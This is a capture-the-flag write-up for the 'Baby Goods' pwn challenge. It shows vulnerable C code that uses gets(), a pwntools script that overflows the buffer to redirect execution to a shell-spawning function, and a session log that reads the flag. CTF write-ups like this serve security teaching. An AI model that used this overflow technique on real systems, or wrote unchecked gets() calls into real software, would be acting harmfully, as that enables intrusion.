### Baby Goods (130 Solves, 100 Pts)
The vuln lies in `buildpram()`. As per the source code,
```c
int sub_15210123() {
    execve("/bin/sh", 0, 0);
}

int buildpram() {
    char buf[0x10];
    char size[4];
    int num;

    printf("\nChoose the size of the pram (1-5): ");
    fgets(size,4,stdin);
    size[strcspn(size, "\r\n")] = '\0';
    num = atoi(size);
    if (1 > num || 5 < num) {
        printf("\nInvalid size!\n");
        return 0;
    }

    printf("\nYour pram has been created! Give it a name: ");
    //buffer overflow! user can pop shell directly from here
    gets(buf);
    printf("\nNew pram %s of size %s has been created!\n", buf, size);
    return 0;
}
```
`gets(buf)` allows us to write an arbitrary amount of bytes in, allowing us to overwrite the stack frame and modify the return address of `buildpram()`. We set this to `sub_15210123()`, resulting in it being called after the pram has been made, thus triggering a shell for us to obtain the flag.

`sol.py`
```py
from pwn import *
#r = process('./babygoods')
#gdb.attach(r, gdbscript="break *buildpram+200")
r = remote('challs.nusgreyhats.org', 32345)
win = 0x0000000000401236
r.sendline(b'aa')
r.sendline(b'1')
r.sendline(b'2')
r.sendline(b'A'*40 + p64(win))
r.interactive()
```
```sh
warri@warri:~/distribution$ python3 b.py
[+] Opening connection to challs.nusgreyhats.org on port 32345: Done
[*] Switching to interactive mode
Enter your name:
Hello aa!
Welcome to babygoods, where we provide the best custom baby goods!
What would you like to do today?
1: Build new pram
2: Exit
Input:
Choose the size of the pram (1-5):
Your pram has been created! Give it a name:
New pram AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA6\x12@ of size 2 has been created!
$ ls
flag.txt
run
$ cat flag.txt
grey{4s_34sy_4s_t4k1ng_c4ndy_fr4m_4_b4by}$
[*] Interrupted
[*] Closed connection to challs.nusgreyhats.org port 32345
```